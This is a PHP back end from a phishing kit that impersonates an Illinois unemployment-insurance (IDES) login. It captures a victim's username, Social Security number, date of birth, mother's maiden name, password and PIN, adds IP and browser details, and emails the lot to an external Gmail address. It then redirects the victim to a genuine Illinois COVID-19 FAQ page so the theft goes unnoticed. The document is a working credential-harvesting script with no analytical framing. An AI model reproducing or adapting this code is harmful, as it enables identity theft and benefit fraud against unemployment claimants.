<?

$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");
$message .= "--------Created By mR.j0n3z -----\n";
$message .= "Username    : ".$_POST['username']."\n";
$message .= "SSN   : ".$_POST['SSN']."\n";
$message .= "Date Of Birth   : ".$_POST['DOB']."\n";
$message .= "MMN   : ".$_POST['MMN']."\n";
$message .= "Password     : ".$_POST['password']."\n";
$message .= "Pin     : ".$_POST['Pin']."\n";
$message .= "--------------i.p----------------\n";
$message .= "IP: ".$ip."\n";
$message .= "Date : $adddate\n";
$message .= "User-Agent: ".$browser."\n";
$message .= "-------Created By j0n3z----------\n";


$recipient = "mark.mcgraw111@gmail.com";
$subject = "IL UI REZ.|$ip";
$headers = "Moded By mR.j0n3z";
mail($recipient,$subject,$message,$headers);
header("Location: https://www2.illinois.gov/ides/Pages/FAQ_COVID-19.aspx");
?>